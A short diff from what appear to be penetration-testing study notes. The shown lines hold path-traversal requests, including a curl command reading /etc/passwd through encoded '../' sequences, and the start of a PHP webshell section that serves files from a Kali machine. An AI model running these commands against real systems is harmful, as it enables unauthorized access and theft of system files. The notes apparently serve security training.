@@ -1076,10 +1076,11 @@ http://192.168.221.193:3000/public/plugins/alertlist/../../../../../../../../Use
 curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 ```
 
-- PHP webshell
+## PHP webshell
 
 ```powershell
-#See Relia Legacy for detailed notes
+
+#See Relia Legacy for detailed notes (Windows example)
 
 #after our simple php command shell if uploaded we can run the following commands
 (kali㉿kali)-[~/Desktop/Windows Privesc]$ python3 -m http.server #start http server
